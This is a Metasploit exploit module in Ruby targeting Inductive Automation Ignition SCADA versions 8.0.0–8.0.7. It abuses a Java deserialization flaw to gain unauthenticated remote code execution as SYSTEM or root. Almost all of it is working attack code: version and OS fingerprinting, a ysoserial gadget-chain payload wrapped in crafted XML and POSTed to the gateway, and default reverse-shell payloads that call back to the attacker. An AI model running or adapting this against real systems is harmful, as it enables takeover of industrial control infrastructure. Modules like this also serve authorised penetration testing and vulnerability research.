##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Inductive Automation Ignition Remote Code Execution',
        'Description' => %q{
          This module exploits a Java deserialization vulnerability in the Inductive
          Automation Ignition SCADA product, versions 8.0.0 to (and including) 8.0.7.
          This exploit was tested on versions 8.0.0 and 8.0.7 on both Linux and Windows.
          The default configuration is exploitable by an unauthenticated attacker,
          which can achieve remote code execution as SYSTEM on a Windows
          installation and root on Linux. The vulnerability was discovered and 
          exploited at Pwn2Own Miami 2020 by the Flashback team (Pedro Ribeiro +
          Radek Domanski).
        },
        'License' => MSF_LICENSE,
        'Author' =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability discovery and Metasploit module
          'Radek Domanski <radek.domanski[at]gmail.com> @RabbitPro' # Vulnerability discovery and Metasploit module
        ],
        'References' =>
          [
            [ 'URL', ''],
            [ 'CVE', 'CVE-2020-12004'],
            [ 'CVE', 'CVE-2020-10644'],
            [ 'CVE', 'CVE-2020-12004'],
            [ 'ZDI', 'ZDI-20-685'],
            [ 'ZDI', 'ZDI-20-686'],
            [ 'ZDI', 'ZDI-20-687' ]
          ],
        'Privileged' => true,
        'Platform' => %w[unix win],
        'DefaultOptions' =>
          {
            'WfsDelay' => 15
          },
        'Targets' =>
          [
            [ 'Automatic', {} ],
            [
              'Windows',
              'Platform' => 'win',
              'DefaultOptions' =>
                { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' },
            ],
            [
              'Linux',
              'Platform' => 'unix',
              'Arch' => [ARCH_CMD],
              'DefaultOptions' =>
                { 'PAYLOAD' => 'cmd/unix/reverse_python' },
            ]
          ],
        'DisclosureDate' => 'Apr XX 2020',
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        Opt::RPORT(8088)
      ]
    )
  end

  def version_get
    res = send_request_cgi({
      'uri'    => '/system/gwinfo',
      'method' => 'GET'
    })

    if res && res.code == 302
      # try again, versions < 8 use a different URL
      res = send_request_cgi({
        'uri'    => '/main/system/gwinfo',
        'method' => 'GET'
      })
    end

    if res && res.code == 200
      # Regexp to get the version of the server
      version = res.body.match(/;Version=([0-9\.]{3,});/)
      if version
        return version[1]
      end
    end
    return ''
  end

  def os_get
    res = send_request_cgi({
      'uri'    => '/system/gwinfo',
      'method' => 'GET'
    })
    if res && res.code == 200
      # Regexp to get the OS
      os = res.body.match(/OS=([a-zA-Z0-9\s]+);/)
      return os[1]
    end
  end

  def create_java_str(payload)
    (
      "\xac\xed" +                  # STREAM_MAGIC
      "\x00\x05" +                  # STREAM_VERSION
      "\x74" +                      # String object
      [payload.length].pack('n') +  # length
      payload
    ).force_encoding('ascii')       # is this needed in msf?
  end

  def check
    version = version_get
    version = version.split('.')
    if version.length < 3
      fail_with(Failure::Unknown, 'Failed to obtain target version')
    end
    print_status("#{peer} - Detected version #{version[0]}.#{version[1]}.#{version[2]}")
    # versions between 8.0.0 and 8.0.7 (inclusive) are vulnerable
    if version[0].to_i == 8 && version[1].to_i == 0 && version[2].to_i < 8
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def pick_target
    os = os_get
    if os =~ /Windows/
      return targets[1]
    elsif os =~ /Linux/
      return targets[2]
    else
      fail_with(Failure::NoTarget, "#{peer} - Unable to select a target, we must bail out.")
    end
  end

  def exploit
    # Check if automatic target selection is set
    if target.name == 'Automatic'
      my_target = pick_target
    else
      my_target = target
    end
    print_status("#{peer} - Attacking #{my_target.name} target")

    # <version> is a CRC32 calculated by the server that we didn't want to reverse
    # However in com.inductiveautomation.ignition.gateway.servlets.Gateway.doPost()
    # (line 383 of gateway-8.0.7.jar)
    # ... it will helpfully ignore the version if set to 0
    data =
      '<?xml version="1.0" encoding="UTF-8"?><requestwrapper><version>0</version><scope>2</scope><message><messagetype>199</messagetype><messagebody>'\
      '<arg name="funcId"><![CDATA[ProjectDownload]]></arg><arg name="subFunction"><![CDATA[getDiff]]></arg><arg name="arg" index="0">'\
      '<![CDATA['

    if my_target.name == 'Windows'
      cmd = cmd_psh_payload(payload.encoded, payload_instance.arch.first, { remove_comspec: true, encode_final_payload: true })
    else
      cmd = payload.encoded
    end

    version = version_get

    if version
      print_status("#{peer} - Detected version #{version}")
    else
      print_error("#{peer} - Target has an unknown version, this might not work...")
    end

    # Version 8.0.0 doesn't work with CommonsBeanutils1, but CommonsCollections6 works!
    #
    # An alternative to this would be GET /system/launchmf/D which will helpfully return
    # a list of all the jars in the system, letting us pick the right gadget chain.
    # However only 8.0.0 differs, so let's just have a special case for that.
    if version.length >= 3 && version[0] == 8 && version[1] == 0 && version[2] == 0
      lib = 'CommonsCollections6'
    else
      lib = 'CommonsBeanutils1'
    end
    payload = ::Msf::Util::JavaDeserialization.ysoserial_payload(lib, cmd)
    payload = Rex::Text.encode_base64(payload)
    payload = create_java_str(payload)
    payload = Rex::Text.encode_base64(payload)
    data += payload

    data += ']]></arg></messagebody></message><locale><l>en</l><c>GB</c><v></v></locale></requestwrapper>'

    print_status("#{peer} - Sending payload...")

    res = send_request_cgi({
      'uri' => '/system/gateway',
      'method' => 'POST',
      'data' => data
    })

    if res&.body&.include?('Unable to load project diff.')
      print_good("#{peer} - Success, shell incoming!")
    else
      print_error("#{peer} - Something is not right, try again?")
    end
  end
end
